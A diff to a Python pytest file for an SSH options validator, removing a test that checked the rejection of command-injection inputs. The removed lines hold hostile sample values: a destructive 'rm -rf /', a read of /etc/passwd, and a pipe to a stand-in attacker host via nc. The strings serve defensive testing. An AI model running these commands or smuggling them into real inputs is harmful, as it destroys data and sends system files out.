@@ -113,16 +113,6 @@ class TestValidateSshOpts:
         opts = "-p 2222 -i ~/.ssh/key -o ConnectTimeout=10"
         assert validate_ssh_opts(opts) == opts
 
-    def test_rejects_command_injection_attempts(self):
-        """Should reject command injection attempts."""
-        with pytest.raises(ValueError, match="Invalid SSH options"):
-            validate_ssh_opts("-p 2222; rm -rf /")
-
-        with pytest.raises(ValueError, match="Invalid SSH options"):
-            validate_ssh_opts("-p 2222 && cat /etc/passwd")
-
-        with pytest.raises(ValueError, match="Invalid SSH options"):
-            validate_ssh_opts("-p 2222 | nc attacker.com 1234")
 
     def test_rejects_backticks(self):
         """Should reject backticks (command substitution)."""
